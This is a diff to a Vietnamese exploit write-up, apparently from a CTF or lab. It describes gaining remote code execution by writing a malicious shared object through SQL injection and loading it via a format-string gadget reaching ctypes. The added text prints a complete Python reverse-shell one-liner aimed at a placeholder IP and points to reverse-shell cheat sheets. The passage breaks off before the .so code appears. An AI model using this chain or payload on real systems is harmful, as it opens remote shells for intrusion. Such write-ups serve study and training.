@@ -271,5 +271,17 @@ Kết hợp thêm với 2 dữ kiện chúng ta đã có ở trước:
 
 Chúng ta có được RCE bằng cách:
 1) Nạp một file .so độc hại lên server bằng cách ghi file thông qua SQL injection
-2) Thực thi file vừa nạp vào thông qua Format string syntax trong str.format_map() và 
-3) 
+2) Thực thi file vừa nạp vào thông qua Format string syntax trong str.format_map() qua thư viện ctypes được import vào.
+3) Lúc này mặc dù chỉ gọi được đến thuộc tính` __getattr__` nhưng đủ để chúng ta load được file shared object của mình => Chỉ cần để một đoạn mã tự thực thi khi file .so của chúng ta được load thì chúng ta sẽ exploit thành công.
+
+# 2. Exploitttttttt !!!!!
+
+Mình định thực thi mã trên server và bắt Reverse shell về trên VPS của mình cho tiện. Mình test trên server thì thấy không có nc hay ncat nên mình dùng python:
+Payload mình lấy ở: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
+Bạn có thể dùng công cụ tự động tạo payload ở: https://www.revshells.com/
+
+![[Attachments/Pasted image 20261119111924.png]]
+
+Payload mình dùng: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IPv4>",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+
+Oke, thế là mình sẽ tạo ngay cho bản thân một file .so tự động thự thi mã trên khi được load như sau:
